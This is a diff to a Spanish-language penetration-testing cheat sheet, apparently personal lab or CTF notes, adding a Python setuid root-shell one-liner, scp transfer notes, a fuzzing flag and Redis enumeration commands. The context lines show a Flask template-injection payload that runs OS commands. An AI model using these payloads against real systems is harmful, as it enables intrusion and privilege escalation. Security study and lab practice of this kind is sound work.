@@ -51,6 +51,8 @@
 
 	python3 -c 'import pty; pty.spawn("/bin/bash")'
 
+	python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
 7. Template Injection | Flask:
 
 	• {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
@@ -257,21 +259,35 @@
 
 	sudo systemctl start ssh
 
-3. Se usa el comando scp:
+3. Para subir/bajar archivos:
 
-	scp [user@]host:[host-path] [my-path]
+	• Copiar de la máquina remota a nuestro host:
 
-	• De ser necesario: 
+	scp [user@]host:[host-path] <my-path>
+
+	De ser necesario: 
 
 	  - Usar "sudo"
 
 	  - Establecer puerto con -P
 
-4. Cerrar el servicio SSH:
+	• Copiar del host a la máquina remota:
+
+	scp <my_math> [user]@host:[host-path]
+
+4. Flags útiles:
+
+	• -r: recursivo
+
+	• -P: puerto
+
+	• -v: verbose (debug)
+
+5. Cerrar el servicio SSH:
 
 	sudo systemctl stop ssh
 
-5. Se pueden establecer parámetros:
+6. Se pueden establecer parámetros:
 
 	scp -P <PORT> -o PreferredAuthentications=password [user@]host:[host-path] [my-path]
 
@@ -537,6 +553,8 @@ msfconsole                          msfvenom
 	-b: blacklist
 
 	--xl: exclude length
+
+	-r: follow redirects
 
 2. Fuzzing de parámetros: 
 
@@ -951,6 +969,16 @@ En contexto de seguridad es interesante porque históricamente ha tenido configu
 	-a <PASSWORD>
 
 2. Una vez dentro:
+
+	- INFO: Información sobre la bbdd
+
+	- SELECT: seccionar la base de datos, hay de 0-16 bbdd.
+
+	- KEYS *: Lista todas las "keys" de la bbdd seleccionada.
+
+	- GET [key]: Obtener "value" de una "key"
+
+	- TYPE [key]: Ver tipo de "value" de una "key"
 
 	https://redis.io/docs/latest/commands/redis-8-6-commands/
 ---------------------------------------------------------------------------------
